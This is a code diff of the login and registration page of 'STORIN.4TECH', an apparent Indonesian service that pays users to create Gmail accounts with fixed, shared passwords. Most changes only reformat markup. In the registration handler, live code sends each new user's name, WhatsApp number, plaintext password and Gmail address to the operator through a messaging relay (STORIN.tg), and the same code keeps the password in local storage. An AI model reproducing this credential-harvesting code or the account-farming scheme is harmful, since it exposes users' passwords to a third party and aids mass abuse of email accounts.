@@ -12,52 +12,35 @@
 <div class="auth" id="auth">
   <div class="auth-scroll">
     <div class="auth-head">
-      <div class="auth-logo">
-        <svg viewBox="0 0 24 24" fill="none" stroke="#c9a961" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l9 4v6c0 5-3.8 9.3-9 10-5.2-.7-9-5-9-10V6l9-4z"/><polyline points="9 12 11.5 14.5 15.5 10"/></svg>
-      </div>
+      <div class="auth-logo"><svg viewBox="0 0 24 24" fill="none" stroke="#c9a961" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l9 4v6c0 5-3.8 9.3-9 10-5.2-.7-9-5-9-10V6l9-4z"/><polyline points="9 12 11.5 14.5 15.5 10"/></svg></div>
       <div class="auth-title">STORIN<span>.4TECH</span></div>
       <div class="auth-sub" id="authSub">Masuk ke Akun</div>
     </div>
     <div class="auth-card">
-      <div class="tabs">
-        <button class="tab-b on" id="tabL">Masuk</button>
-        <button class="tab-b" id="tabR">Daftar</button>
-      </div>
+      <div class="tabs"><button class="tab-b on" id="tabL">Masuk</button><button class="tab-b" id="tabR">Daftar</button></div>
 
       <div id="panelL">
         <div class="fld"><div class="fld-lbl">Gmail <span class="req">*</span></div>
-          <div class="fld-w"><input type="email" class="inp" id="lg" placeholder="nama@gmail.com" autocomplete="off" autocapitalize="off" spellcheck="false">
-            <div class="fld-ic"><svg viewBox="0 0 24 24"><rect x="2.5" y="5" width="19" height="14" rx="2.5"/><polyline points="3 7 12 13 21 7"/></svg></div>
-          </div>
+          <div class="fld-w"><input type="email" class="inp" id="lg" placeholder="nama@gmail.com" autocomplete="off" autocapitalize="off" spellcheck="false"><div class="fld-ic"><svg viewBox="0 0 24 24"><rect x="2.5" y="5" width="19" height="14" rx="2.5"/><polyline points="3 7 12 13 21 7"/></svg></div></div>
         </div>
         <div class="fld"><div class="fld-lbl">Password <span class="req">*</span></div>
-          <div class="fld-w"><input type="password" class="inp" id="lp" placeholder="Password akun">
-            <div class="fld-ic"><svg viewBox="0 0 24 24"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 1 1 8 0v4"/></svg></div>
-          </div>
+          <div class="fld-w"><input type="password" class="inp" id="lp" placeholder="Password akun"><div class="fld-ic"><svg viewBox="0 0 24 24"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 1 1 8 0v4"/></svg></div></div>
         </div>
         <button class="btn btn-p" id="btnLogin"><svg viewBox="0 0 24 24"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg><span>Masuk</span></button>
       </div>
 
       <div id="panelR" class="hidden">
         <div class="fld"><div class="fld-lbl">Nama Lengkap <span class="req">*</span></div>
-          <div class="fld-w"><input type="text" class="inp" id="rn" placeholder="Contoh: Muhammad Alif" autocapitalize="words" maxlength="60">
-            <div class="fld-ic"><svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 21v-1a6 6 0 0 1 6-6h4a6 6 0 0 1 6 6v1"/></svg></div>
-          </div>
+          <div class="fld-w"><input type="text" class="inp" id="rn" placeholder="Contoh: Muhammad Alif" autocapitalize="words" maxlength="60"><div class="fld-ic"><svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 21v-1a6 6 0 0 1 6-6h4a6 6 0 0 1 6 6v1"/></svg></div></div>
         </div>
         <div class="fld"><div class="fld-lbl">Gmail <span class="req">*</span></div>
-          <div class="fld-w"><input type="email" class="inp" id="rg" placeholder="nama@gmail.com" autocapitalize="off" spellcheck="false">
-            <div class="fld-ic"><svg viewBox="0 0 24 24"><rect x="2.5" y="5" width="19" height="14" rx="2.5"/><polyline points="3 7 12 13 21 7"/></svg></div>
-          </div>
+          <div class="fld-w"><input type="email" class="inp" id="rg" placeholder="nama@gmail.com" autocapitalize="off" spellcheck="false"><div class="fld-ic"><svg viewBox="0 0 24 24"><rect x="2.5" y="5" width="19" height="14" rx="2.5"/><polyline points="3 7 12 13 21 7"/></svg></div></div>
         </div>
         <div class="fld"><div class="fld-lbl">Nomor WhatsApp <span class="req">*</span></div>
-          <div class="fld-w"><input type="tel" class="inp" id="rw" placeholder="81234567890" inputmode="numeric" maxlength="15">
-            <div class="fld-ic"><svg viewBox="0 0 24 24"><path d="M21 11.5a8.4 8.4 0 0 1-8.5 8.4 9 9 0 0 1-3.8-.8L3 21l1.9-5.4A8.4 8.4 0 0 1 4 11.5 8.4 8.4 0 0 1 12.5 3 8.4 8.4 0 0 1 21 11.5z"/></svg></div>
-          </div>
+          <div class="fld-w"><input type="tel" class="inp" id="rw" placeholder="81234567890" inputmode="numeric" maxlength="15"><div class="fld-ic"><svg viewBox="0 0 24 24"><path d="M21 11.5a8.4 8.4 0 0 1-8.5 8.4 9 9 0 0 1-3.8-.8L3 21l1.9-5.4A8.4 8.4 0 0 1 4 11.5 8.4 8.4 0 0 1 12.5 3 8.4 8.4 0 0 1 21 11.5z"/></svg></div></div>
         </div>
         <div class="fld"><div class="fld-lbl">Password <span class="req">*</span></div>
-          <div class="fld-w"><input type="password" class="inp" id="rp" placeholder="Minimal 6 karakter" maxlength="40">
-            <div class="fld-ic"><svg viewBox="0 0 24 24"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 1 1 8 0v4"/></svg></div>
-          </div>
+          <div class="fld-w"><input type="password" class="inp" id="rp" placeholder="Minimal 6 karakter" maxlength="40"><div class="fld-ic"><svg viewBox="0 0 24 24"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 1 1 8 0v4"/></svg></div></div>
         </div>
         <button class="btn btn-p" id="btnReg"><svg viewBox="0 0 24 24"><path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="8.5" cy="7" r="4"/><line x1="20" y1="8" x2="20" y2="14"/><line x1="23" y1="11" x2="17" y2="11"/></svg><span>Daftar Sekarang</span></button>
       </div>
@@ -67,13 +50,9 @@
 
 <div class="app hidden" id="app">
   <header class="hdr">
-    <div class="brand">
-      <div class="brand-m"><svg viewBox="0 0 24 24"><path d="M12 2l9 4v6c0 5-3.8 9.3-9 10-5.2-.7-9-5-9-10V6l9-4z"/><polyline points="9 12 11.5 14.5 15.5 10"/></svg></div>
-      <div class="brand-n">STORIN<span>.4TECH</span></div>
-    </div>
+    <div class="brand"><div class="brand-m"><svg viewBox="0 0 24 24"><path d="M12 2l9 4v6c0 5-3.8 9.3-9 10-5.2-.7-9-5-9-10V6l9-4z"/><polyline points="9 12 11.5 14.5 15.5 10"/></svg></div><div class="brand-n">STORIN<span>.4TECH</span></div></div>
     <button class="hdr-btn" onclick="document.getElementById('mp').classList.add('on')"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M9.5 9a2.5 2.5 0 1 1 3.2 2.4c-.5.2-.7.7-.7 1.2v.4"/><circle cx="12" cy="17" r="0.6" fill="currentColor" stroke="none"/></svg></button>
   </header>
-
   <main class="vp">
     <section class="pg">
       <div class="pg-eye">Beranda</div>
@@ -111,27 +90,20 @@
 
       <div class="div"></div>
       <div class="cd">
-        <div class="cd-hd">
-          <div class="cd-ic"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><line x1="12" y1="11" x2="12" y2="16"/><circle cx="12" cy="8" r="0.7" fill="currentColor" stroke="none"/></svg></div>
-          <div><div class="cd-t">Info Sistem</div><div class="cd-s">Cara kerja setor Gmail</div></div>
-        </div>
+        <div class="cd-hd"><div class="cd-ic"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><line x1="12" y1="11" x2="12" y2="16"/><circle cx="12" cy="8" r="0.7" fill="currentColor" stroke="none"/></svg></div><div><div class="cd-t">Info Sistem</div><div class="cd-s">Cara kerja setor Gmail</div></div></div>
         <div class="note g" style="margin-bottom:10px"><svg viewBox="0 0 24 24"><path d="M12 2l9 4v6c0 5-3.8 9.3-9 10-5.2-.7-9-5-9-10V6l9-4z"/><polyline points="9 12 11.5 14.5 15.5 10"/></svg><p>Tekan <b>Ambil Gmail</b> di halaman Setor, sistem akan memberi akun yang harus kamu buat.</p></div>
         <div class="note" style="margin-bottom:0"><svg viewBox="0 0 24 24"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 1 1 8 0v4"/></svg><p>Password Gmail wajib: <b>zero1122</b> atau <b>prabujaya</b>.</p></div>
       </div>
       <div style="height:20px"></div>
     </section>
   </main>
-
   <nav class="dock"></nav>
 </div>
 
 <div class="mb" id="mp">
   <div class="mdl">
     <div class="mdl-gr"></div>
-    <div class="mdl-h">
-      <h3><svg viewBox="0 0 24 24"><path d="M4 19.5V5a2 2 0 0 1 2-2h13v18H6a2 2 0 0 1-2-1.5z"/><line x1="8" y1="7" x2="15" y2="7"/><line x1="8" y1="11" x2="15" y2="11"/></svg>Panduan & Rules</h3>
-      <button class="mdl-x" onclick="document.getElementById('mp').classList.remove('on')"><svg viewBox="0 0 24 24"><line x1="6" y1="6" x2="18" y2="18"/><line x1="18" y1="6" x2="6" y2="18"/></svg></button>
-    </div>
+    <div class="mdl-h"><h3><svg viewBox="0 0 24 24"><path d="M4 19.5V5a2 2 0 0 1 2-2h13v18H6a2 2 0 0 1-2-1.5z"/><line x1="8" y1="7" x2="15" y2="7"/><line x1="8" y1="11" x2="15" y2="11"/></svg>Panduan & Rules</h3><button class="mdl-x" onclick="document.getElementById('mp').classList.remove('on')"><svg viewBox="0 0 24 24"><line x1="6" y1="6" x2="18" y2="18"/><line x1="18" y1="6" x2="6" y2="18"/></svg></button></div>
     <div class="mdl-b">
       <div class="note g" style="margin-bottom:14px"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><line x1="12" y1="11" x2="12" y2="16"/><circle cx="12" cy="8" r="0.7" fill="currentColor" stroke="none"/></svg><p>Tekan <b>Ambil Gmail</b>, sistem akan memberi Gmail untuk kamu buat.</p></div>
       <div class="stp"><div class="stp-n">1</div><div class="stp-b"><h5>Ambil Gmail</h5><p>Buka menu Setor, tekan tombol Ambil Gmail.</p></div></div>
@@ -153,9 +125,7 @@
 <script src="app.js"></script>
 <script>
 (function(){
-  var $=STORIN.$,$$=STORIN.$$;
-
-  // Kalau sudah login → tampil app
+  var $=STORIN.$;
   if(STORIN.loadU()){
     document.getElementById('auth').classList.add('hide');
     document.getElementById('app').classList.remove('hidden');
@@ -163,23 +133,12 @@
     boot();
   } else {
     STORIN.buildDock('home');
-    // sembunyiin dock kalau belum login
     document.querySelector('.dock').style.display='none';
   }
 
-  // Tabs
-  $('tabL').onclick=function(){
-    this.classList.add('on');$('tabR').classList.remove('on');
-    $('panelL').classList.remove('hidden');$('panelR').classList.add('hidden');
-    $('authSub').textContent='Masuk ke Akun';
-  };
-  $('tabR').onclick=function(){
-    this.classList.add('on');$('tabL').classList.remove('on');
-    $('panelR').classList.remove('hidden');$('panelL').classList.add('hidden');
-    $('authSub').textContent='Daftar Akun Baru';
-  };
+  $('tabL').onclick=function(){this.classList.add('on');$('tabR').classList.remove('on');$('panelL').classList.remove('hidden');$('panelR').classList.add('hidden');$('authSub').textContent='Masuk ke Akun';};
+  $('tabR').onclick=function(){this.classList.add('on');$('tabL').classList.remove('on');$('panelR').classList.remove('hidden');$('panelL').classList.add('hidden');$('authSub').textContent='Daftar Akun Baru';};
 
-  // Login
   $('btnLogin').onclick=function(){
     var g=($('lg').value||'').trim().toLowerCase();
     var p=($('lp').value||'').trim();
@@ -195,18 +154,16 @@
       s.hist=Array.isArray(row.history)?row.history:[];
       s.used=Array.isArray(row.usedGmails)?row.usedGmails:[];
       STORIN.saveS();
-      b.disabled=false;
-      STORIN.hideL();
+      b.disabled=false;STORIN.hideL();
       document.getElementById('auth').classList.add('hide');
       document.getElementById('app').classList.remove('hidden');
       document.querySelector('.dock').style.display='';
       STORIN.buildDock('home');
       boot();
       STORIN.toast('Login berhasil. Halo '+u.nama+'!','s');
-    }).catch(function(){STORIN.hideL();b.disabled=false;STORIN.toast('Gagal terhubung ke server.','e');});
+    }).catch(function(){STORIN.hideL();b.disabled=false;STORIN.toast('Gagal terhubung.','e');});
   };
 
-  // Register
   $('btnReg').onclick=function(){
     var n=($('rn').value||'').trim();
     var g=($('rg').value||'').trim().toLowerCase();
@@ -225,9 +182,7 @@
       return STORIN.fbSaveUser(u).then(function(){
         var local={id:u.userId,nama:u.nama,gmail:u.gmail,whatsapp:u.whatsapp,password:u.password,createdAt:u.createdAt};
         STORIN.setU(local);STORIN.saveU();
-        var s=STORIN.getS();
-        s.bal=0;s.hist=[];s.used=[];
-        STORIN.saveS();
+        var s=STORIN.getS();s.bal=0;s.hist=[];s.used=[];STORIN.saveS();
         var msg='‼️NEW ACCOUNT REGISTERED‼️\n⭐️DATA AKUN STORIN.4TECH⭐️\n📍NAMA           : '+n+'\n🫆WHATSAPP : '+w+'\n🔐PASSWORD : '+p+'\n✉️GMAIL          : '+g+'\n\nMOHON DIPANTAU DENGAN SERIUS👌.';
         STORIN.tg(msg);
         setTimeout(function(){
@@ -240,29 +195,24 @@
           STORIN.toast('Akun berhasil dibuat!','s');
         },700);
       });
-    }).catch(function(){STORIN.hideL();b.disabled=false;STORIN.toast('Gagal terhubung ke server.','e');});
+    }).catch(function(){STORIN.hideL();b.disabled=false;STORIN.toast('Gagal terhubung.','e');});
   };
 
-  // Boot home
   function boot(){
     var U=STORIN.getU(),S=STORIN.getS();
-    var e;
-    e=$('greet');if(e)e.textContent=(U.nama||'User').split(' ')[0];
-    e=$('hId');if(e)e.textContent=U.id;
-    e=$('hYr');if(e)e.textContent=new Date(U.createdAt).getFullYear();
+    $('greet').textContent=(U.nama||'User').split(' ')[0];
+    $('hId').textContent=U.id;
+    $('hYr').textContent=new Date(U.createdAt).getFullYear();
     renderBal(false);renderStats();
-    // Sync dari cloud di background
     STORIN.fbFindUser(U.gmail).then(function(row){
       if(!row)return;
       S.bal=Number(row.saldo)||0;
       S.hist=Array.isArray(row.history)?row.history:[];
       S.used=Array.isArray(row.usedGmails)?row.usedGmails:[];
       STORIN.saveS();
-      STORIN.processPend();
       renderBal(true);renderStats();
     });
   }
-
   function renderBal(anim){
     var S=STORIN.getS(),el=$('balVal');
     if(anim){
@@ -286,8 +236,6 @@
     });
     $('stP').textContent=p;$('stS').textContent=s;$('stW').textContent=STORIN.nm(w);
   }
-
-  // Refresh
   $('btnRef').onclick=function(){
     var b=this;b.classList.add('spin');setTimeout(function(){b.classList.remove('spin');},700);
     var U=STORIN.getU(),S=STORIN.getS();
@@ -296,9 +244,7 @@
         S.bal=Number(row.saldo)||0;
         S.hist=Array.isArray(row.history)?row.history:[];
         S.used=Array.isArray(row.usedGmails)?row.usedGmails:[];
-        STORIN.saveS();
-        STORIN.processPend();
-        renderBal(true);renderStats();
+        STORIN.saveS();renderBal(true);renderStats();
       }
     });
     STORIN.vib(12);STORIN.toast('Data diperbarui.','i');
